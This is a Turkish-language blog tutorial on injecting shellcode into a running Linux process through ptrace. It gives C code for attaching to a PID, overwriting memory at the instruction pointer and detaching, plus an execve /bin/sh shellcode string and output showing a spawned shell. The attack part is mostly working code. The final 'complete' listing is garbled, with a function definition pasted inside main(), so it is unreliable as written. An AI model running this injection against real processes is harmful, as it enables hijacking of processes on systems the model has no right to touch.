---
title: Linux Process Shellcode Injection
layout: post
tags: [Linux,Analysis]
author: 0x00fy
---

Merhaba Dostlar yeniyazıma hoşgeldiniz,
Bu yazımızda Linux içerisinde bulunan process‘ler içerisine nasıl shellcode inject edebileceğimizi göreceğiz.


### Bilmeniz Gereken Kavramlar.

**Process Nedir ?**

Fazla komplekse girmeden anlatmak gerekirse , işletim sistemi‘nin arka planında çalışan usermode-applicationlardır.


**Process Shellcode Injection Nedir ?**

Mevcut herhangi bir process içerisinde çalışan bytecode‘ların önüne ekleyeceğimiz veya çeşitli yollar ile yerine geçmesini sağlayacağımız saldırgan istekleri doğrultusunda çalışan bytecode ların bahsettiğim yollar ile hedeflenen process lerde çalışmasının sağlanmasıdır…

### Linux Process Debugging 
Teknik olarak konuşacak olursak Linux’ta bir process e erişmenin en iyi yolu işletim sistemleri tarafından sağlanan Debugging Interfaceleri dir. Linux’ta Debugging için en yaygın olarak kullanılan System Call **ptrace** dir.

Linux’ta Debugging için kullandığımız hemen hemen bütün araçlar ptrace hizmetinin sunumlandırılmış hali diyebiliriz.

**ptrace** Sistem çağrısı bir Process 'te Debugging yapmak için bize yeni bir process sağlar. **ptrace** kullanarak, bir process 'in çalıştırılmasını durdurabileceğimiz , Registerların ve belleğinin değerlerini inceleyebileceğimiz gibi, onları istediğimiz değer ile değiştirebiliriz.

### Herşeyden önce

Çalışan bir process 'e etki edebilmek için yapmamız gereken ilk şey, bir Debugging process başlatmaktır bunun için **ptrace** sistem çağrısını kullanarak Günün sonunda **Kendi küçük debugger ımız** gibi çalışan bir script yazacağız.

Önce kodumuzun nereye enjekte edilmesini istediğimize karar vermeliyiz. Bunun için iki seçeneğimiz mevcut;

Kodu *main()* fonksiyonun bulunduğu adrese enjekte etmeye çalışabiliriz . Oradaki kodun, yalnızca process başlangıcında gerçekleşen bazı yüklemeleri içermesi ihtimali vardır ve bu nedenle, orijinal işlevselliği beklendiği gibi çalışmaya devam edebiliriz.

Kodu *Stack* içerisine enjekte edebiliriz. Bu, processi bozmaktan kaçınmak için oldukça güvenlidir, ancak Enjekte ettiğimiz yerin **NX Bit (Noexec Stack)** ile korunma ihtimalini düşünmeliyiz.

Daha en başından sizi sıkmamak ve anlaşılmasının kolay olması açısından process kontrolünü ele geçirdiğimizde kodu *Instruction Pointer*’a enjekte edeceğiz. Ayrıca enjekte ettiğimiz kod Basit bir şekilde shell çağrısında bulunan ufak bir shellcode olacağından Orijinal Process’e kontrolü geri vermemiz mümkün değil. Yani daha basit bir deyişle program shellcode a yönlendiği için programın Bir kısmı yok olacak , ama bu şu anda bizim için o kadarda önemli değil.

Evet Artık Process 'e nasıl **Shellcode** enjekte edebileceğimizi anladığınıza göre Scriptimizi yazmaya başlayabiliriz. Kodu Doğrudan vermektense size bölüm bölüm açıklamayı tercih ettim.

***Kütüpanelerimizi ekliyoruz :***

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

```

***Main Fonksiyonu Oluşturup değişkenlerimizi tanımlıyoruz :***

```
int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;
  
```



***Bu Bölümde ise ,***

```
if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);
  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }
  printf ("+ Waiting for process...\n");
  wait (NULL);
```



agüman olarak *“target”* değişkenine aldığımız Process ID sine sahip process 'e **ptrace** sistem çağrısının `“PTRACE_ATTACH”` parametresini kullanarak yeni bir Debugging process i oluşturup hedeflediğimiz process e dinamik olarak dahil olmak istiyoruz, ardından Hedeflediğimiz process e dahil olduğumuzu işaret eden ***SIGTRAP*** sinyalini beklemeye koyuluyoruz…

Bu noktada, dahil olmak istediğimiz Process durdurulur ve onu istediğimiz zaman değiştirmeye başlayabiliriz.


  
  
  
  
  
***Burada ise,*** 

```
  printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
```


*ptrace* çağrısının **“PTRACE_GETREGS”** parametresi ile Kontrolümüz altındaki process in Register değerleri regs isimli değişkene atanır.    
 
 
 
 
 
***Aşşağıda gördüğümüz inject_data() Fonksiyonu ise,*** 

```
int inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
int i;
uint32_t *s = (uint32_t *) src;
uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}
```

görüldüğü üzere **prtace** çağrısının **“PTRACE_POKETEXT”** parametresi ; “inject_data” fonksiyonunun parametreleri ile aldığımız verileri (Shellcode , Shellcode inject edileceği yer vs.) üzerinde Debugging işlemi uyguladığımız asıl process’e yazmamızı sağlar bu aynı zamanda process 'e nasıl shellcode inject ettiğimizi de açıklıyor.




***Burada ise,*** 

```
  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
  regs.rip += 2;
```  
  
Kontrolümüz altındaki process 'e shellcode enjekte etmek için kullanacağımız “inject_data” fonsiyonu çağırılır. Burada bulunan regs.rip ise bize daha önceden regs ismindeki değişkene atadığımız Registerlar içerisinden (x64 Mimariye göre) Instruction Pointerı bize verir.  
  
Artık, hedefimizdeki Process Memory, shellcode umuzu içerecek şekilde değiştirildiğine göre, process i tekrar kontrol etmemiz ve çalışmaya devam etmesine izin vermemiz gerekiyor.


***Aşşağıdaki Kodu incelemeye devam edecek olursak ,***

```
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");
 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;
}

```

Burada ptrace çağrısının “PTRACE_DETACH” parametresi ile hedef process e *detach* işlemi gerçekleştirilir. Yani process te Debugging yapmayı durduracağız. Bu eylem, Debugging oturumunu etkili bir şekilde durdurur ve hedef process çalışmaya devam eder..





Test sırasında, Stack içerisine kod enjekte etmeye çalıştığımda hedef program crash oluyordu. Bunun bir nedeni, stack 'in shellcode um için çalıştırılabilir olmamasıydı. *execstack* Aracını kullanarak bu sorunun üstesinden gelebilirsiniz…

Programı derleyip çalıştırdığımızda , çıktı şu şekilde olacaktır :

```
┌─[mehmet@kernel]─[~/Desktop]
└──╼ $./ptr 1349
+ Tracing process 1349
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x7f74bfde45ce
+ Setting instruction pointer to 0x7f74bfde45d0
+ Run it!
$
```

Ardından `$ echo $SHELL` komutu ile /bin/sh 'a düştüğümüzü görebiliyoruz.

```
unsigned char shellcode[] = \
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
```
Bu kısımdan shellcode 'u kendinize göre ayarlayabilirsiniz


### Scriptin Tamamlanmış Hali

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
 
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
 
#include <sys/user.h>
#include <sys/reg.h>
 
 
 
unsigned char shellcode[] = \
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
 
 
 
 
int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;
  int                     SHELLCODE_SIZE;
  
  
    
 
SHELLCODE_SIZE = strlen(shellcode);
 
  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);
  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }
  printf ("+ Waiting for process...\n");
  wait (NULL);
  
  int
  
  
  
  
  
  
  
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;
 
  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
    {
      perror ("ptrace(POKETEXT):");
      return -1;
    }
    }
  return 0;
}
  
  
  
 
 
  
printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
 
  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
  regs.rip += 2;          
  
  
  
  
  
 
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");
 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(DETACH):");
      exit (1);
    }
  return 0;
}
```


### THE END

Yazı hakkında aklınızda soru işareti varsa yorumlarda belirtebilirsiniz, Eksik gedik gördüğünüz yerleri bildirebilirsiniz..
